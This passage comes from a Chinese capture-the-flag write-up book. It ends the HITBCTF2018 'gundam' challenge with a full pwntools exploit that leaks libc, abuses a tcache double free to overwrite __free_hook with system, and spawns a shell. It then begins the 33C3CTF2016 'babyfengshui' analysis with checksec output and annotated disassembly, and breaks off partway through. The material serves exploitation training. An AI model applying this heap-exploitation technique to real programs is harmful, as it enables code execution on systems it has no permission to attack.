可以看到程序并没有在字符串后加 \x00 隔断，所以可以将 unsorted bin 的地址
泄漏出来，然后通过计算得到 libc 基址。
[*] libc base: 0x7ffff79f8000
[*] __free_hook address: 0x7ffff7dd48a8
[*] system address: 0x7ffff7a3fdc0
overwrite
def overwrite():
destroy(2)
destroy(1)
destroy(0)
destroy(0) # double free
blow_up()
build(p64(__free_hook_addr)) # 0
build('/bin/sh\x00') # 1
build(p64(system_addr)) # 2
触发 double free 时：
1235
6.1.19 pwn HITBCTF2018 gundam
gdb-peda$ x/30gx 0x0000555555757000+0x10
0x555555757010: 0x0000000000000000 0x0400000000000000 : 0x00007ffff7a3fdc0
gdb-peda$ p system
$2 = {} 0x7ffff7a3fdc0 
pwn
1236
6.1.19 pwn HITBCTF2018 gundam
def pwn():
destroy(1)
io.interactive()
Bingo!!!
$ python exp.py
[+] Starting local process './gundam': pid 7264
[*] Switching to interactive mode
$ whoami
firmy
exploit
完整的 exp 如下：
#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'
io = process(['./gundam'], env={'LD_PRELOAD':'./libc-2.26.so'})
#elf = ELF('gundam')
libc = ELF('libc-2.26.so')
def build(name):
io.sendlineafter("choice : ", '1')
io.sendlineafter("gundam :", name)
io.sendlineafter("gundam :", '0')
def visit():
io.sendlineafter("choice : ", '2')
def destroy(idx):
io.sendlineafter("choice : ", '3')
io.sendlineafter("Destory:", str(idx))
1237
6.1.19 pwn HITBCTF2018 gundam
def blow_up():
io.sendlineafter("choice : ", '4')
def leak():
global __free_hook_addr
global system_addr
for i in range(9):
build('A'*7)
for i in range(7):
destroy(i) # tcache bin
destroy(7) # unsorted bin
blow_up()
for i in range(8):
build('A'*7)
visit()
leak = u64(io.recvuntil("Type[7]", drop=True)[-6:].ljust(8,
'\x00'))
libc_base = leak - 0x3dac78 # 0x3dac78 = libc_base - leak
__free_hook_addr = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
log.info("libc base: 0x%x" % libc_base)
log.info("__free_hook address: 0x%x" % __free_hook_addr)
log.info("system address: 0x%x" % system_addr)
def overwrite():
destroy(2)
destroy(1)
destroy(0)
destroy(0) # double free
blow_up()
build(p64(__free_hook_addr)) # 0
build('/bin/sh\x00') # 1
build(p64(system_addr)) # 2
1238
6.1.19 pwn HITBCTF2018 gundam
def pwn():
destroy(1)
io.interactive()
if __name__ == "__main__":
leak()
overwrite()
pwn()
参考资料
https://ctftime.org/task/5924
1239
6.1.20 pwn 33C3CTF2016 babyfengshui
6.1.20 pwn 33C3CTF2016 babyfengshui
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file babyfengshui
babyfengshui: ELF 32-bit LSB executable, Intel 80386, version 1
(SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for
GNU/Linux 2.6.32, BuildID[sha1]=cecdaee24200fe5bbd3d34b30404961c
a49067c6, stripped
$ checksec -f babyfengshui
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 0 3 babyfeng
shui
$ strings libc-2.19.so | grep "GNU C"
GNU C Library (Debian GLIBC 2.19-18+deb8u6) stable release versi
on 2.19, by Roland McGrath et al.
Compiled by GNU CC version 4.8.4.
32 位程序，开启了 canary 和 NX。
在 Ubuntu-14.04 上玩一下，添加 user 和显示 user：
1240
6.1.20 pwn 33C3CTF2016 babyfengshui
$ ./babyfengshui
0: Add a user
1: Delete a user
2: Display a user
3: Update a user description
4: Exit
Action: 0
size of description: 10 # description 最大长度（desc_size）
name: AAAA
text length: 5 # description 实际长度（text_size）
text: aaaa
0: Add a user
1: Delete a user
2: Display a user
3: Update a user description
4: Exit
Action: 2
index: 0
name: AAAA
description: aaaa
对于 description 的调整只能在最大长度的范围内，否则程序退出：
0: Add a user
1: Delete a user
2: Display a user
3: Update a user description
4: Exit
Action: 3
index: 0
text length: 20
my l33t defenses cannot be fooled, cya!
题目解析
Add a user
1241
6.1.20 pwn 33C3CTF2016 babyfengshui
[0x080485c0]> pdf @ sub.malloc_816
/ (fcn) sub.malloc_816 239
| sub.malloc_816 (int arg_8h);
| ; var int local_1ch @ ebp-0x1c
| ; var int local_14h @ ebp-0x14
| ; var int local_10h @ ebp-0x10
| ; var int local_ch @ ebp-0xc
| ; arg int arg_8h @ ebp+0x8
| ; CALL XREF from 0x08048b21 (main)
| 0x08048816 push ebp
| 0x08048817 mov ebp, esp
| 0x08048819 sub esp, 0x28
; '('
| 0x0804881c mov eax, dword [arg_8h]
; [0x8:4]=-1 ; 8
| 0x0804881f mov dword [local_1ch], eax
; 将参数 desc_size 放到 [local_1ch]
| 0x08048822 mov eax, dword gs:[0x14]
; [0x14:4]=-1 ; 20
| 0x08048828 mov dword [local_ch], eax
| 0x0804882b xor eax, eax
| 0x0804882d sub esp, 0xc
| 0x08048830 push dword [local_1ch]
| 0x08048833 call sym.imp.malloc
; [local_14h] = malloc(desc_size) 为 description 分配空间
| 0x08048838 add esp, 0x10
| 0x0804883b mov dword [local_14h], eax
| 0x0804883e sub esp, 4
| 0x08048841 push dword [local_1ch]
| 0x08048844 push 0
| 0x08048846 push dword [local_14h]
| 0x08048849 call sym.imp.memset
; memset([local_14h], 0, desc_size) 初始化
| 0x0804884e add esp, 0x10
| 0x08048851 sub esp, 0xc
| 0x08048854 push 0x80
; 128
| 0x08048859 call sym.imp.malloc
; [local_10h] = malloc(0x80) 为 user struct 分配空间
| 0x0804885e add esp, 0x10
1242
6.1.20 pwn 33C3CTF2016 babyfengshui
| 0x08048861 mov dword [local_10h], eax
| 0x08048864 sub esp, 4
| 0x08048867 push 0x80
; 128
| 0x0804886c push 0
| 0x0804886e push dword [local_10h]
| 0x08048871 call sym.imp.memset
; memset([local_10h], 0, 0x80) 初始化
| 0x08048876 add esp, 0x10
| 0x08048879 mov eax, dword [local_10h]
| 0x0804887c mov edx, dword [local_14h]
| 0x0804887f mov dword [eax], edx
; user->desc = desc ; desc = [local_14h]
| 0x08048881 movzx eax, byte [0x804b069]
; [0x804b069:1]=0 ; 取出序号 i
| 0x08048888 movzx eax, al
| 0x0804888b mov edx, dword [local_10h]
| 0x0804888e mov dword [eax*4 + 0x804b080], edx
; store[i] = user 将 user 放到数组里
| 0x08048895 sub esp, 0xc
| 0x08048898 push str.name:
; 0x8048cf3 ; "name: "
| 0x0804889d call sym.imp.printf
; int printf(const char *format)
| 0x080488a2 add esp, 0x10
| 0x080488a5 movzx eax, byte [0x804b069]
; [0x804b069:1]=0
| 0x080488ac movzx eax, al
| 0x080488af mov eax, dword [eax*4 + 0x804b080]
; 取出 store[i]
| 0x080488b6 add eax, 4
; 取出 store[i]->name
| 0x080488b9 sub esp, 8
| 0x080488bc push 0x7c
; '|' ; 124
| 0x080488be push eax
| 0x080488bf call sub.fgets_6bb
; 读入 0x7c 个字符到 store[i]->name，将末尾的 '\n' 换成 '\x0
0'
| 0x080488c4 add esp, 0x10
1243
6.1.20 pwn 33C3CTF2016 babyfengshui
| 0x080488c7 movzx eax, byte [0x804b069]
; [0x804b069:1]=0
| 0x080488ce add eax, 1
; 序号 i = i + 1
| 0x080488d1 mov byte [0x804b069], al
; [0x804b069:1]=0 ; 写回去
| 0x080488d6 movzx eax, byte [0x804b069]
; [0x804b069:1]=0 ; 取出 i
| 0x080488dd sub eax, 1
; i = i - 1
| 0x080488e0 movzx eax, al
| 0x080488e3 sub esp, 0xc
| 0x080488e6 push eax
| 0x080488e7 call sub.text_length:_724
; 调用更新 description 的函数，参数为 i
| 0x080488ec add esp, 0x10
| 0x080488ef mov eax, dword [local_10h]
| 0x080488f2 mov ecx, dword [local_ch]
| 0x080488f5 xor ecx, dword gs:[0x14]
| ,=< 0x080488fc je 0x8048903
| | 0x080488fe call sym.imp.__stack_chk_fail
; void __stack_chk_fail(void)